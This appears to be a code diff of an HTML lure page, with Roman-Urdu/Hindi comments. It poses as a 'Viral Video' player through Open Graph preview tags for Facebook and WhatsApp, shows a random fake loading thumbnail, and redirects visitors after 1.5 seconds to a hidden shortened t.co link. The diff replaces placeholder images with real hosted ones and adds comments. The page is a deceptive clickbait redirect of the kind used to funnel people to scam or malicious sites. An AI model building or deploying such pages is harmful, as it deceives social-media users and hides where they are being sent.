@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Video Player Loading...</title>
     
+    <!-- Google Analytics -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-530836845"></script>
     <script>
         window.dataLayer = window.dataLayer || [];
@@ -13,10 +14,11 @@
         gtag('config', 'G-530836845');
     </script>
 
+    <!-- Facebook/WhatsApp Preview -->
     <meta property="og:title" content="Watch Full Viral Video Here" />
     <meta property="og:description" content="Click to play the trending video" />
     <meta property="og:type" content="video.other" />
-    <meta property="og:image" content="https://picsum.photos/800/500" />
+    <meta property="og:image" content="https://images2.imgbox.com/60/a2/HTKS5GyQ_o.jpg" />
 
     <style>
         body, html {
@@ -39,16 +41,17 @@
 </head>
 <body>
 
+    <!-- Image Holder -->
     <img id="display-img" class="loading-thumb" src="" alt="Loading Video Player..." />
 
     <script>
-        // Yeh 5 bilkul sahi aur active images hain jo 100% load hongi
+        // AAPKI APNI 5 IMAGES KE 100% WORKING DIRECT LINKS
         var images = [
-            "https://picsum.photos/800/500?random=1",
-            "https://picsum.photos/800/500?random=2",
-            "https://picsum.photos/800/500?random=3",
-            "https://picsum.photos/800/500?random=4",
-            "https://picsum.photos/800/500?random=5"
+            "https://open-images.com/images/HTKS5GyQ.jpg",
+            "https://open-images.com/images/DPM6pJxz.jpg",
+            "https://open-images.com/images/5gSt0BzX.jpg",
+            "https://open-images.com/images/KzV0GW4N.jpg",
+            "https://open-images.com/images/DDQv9R5Q.jpg"
         ];
 
         // Random image select karke source me daalna
@@ -59,7 +62,7 @@
         window.onload = function() {
             var targetUrl = "https://t.co/ai7FHs76Ab"; // Aapka link
             
-            // 1.5 second tak image dikhegi phir redirect hoga
+            // 1.5 second tak aapki image dikhegi phir redirect hoga
             setTimeout(function() {
                 window.location.href = targetUrl;
             }, 1500); 
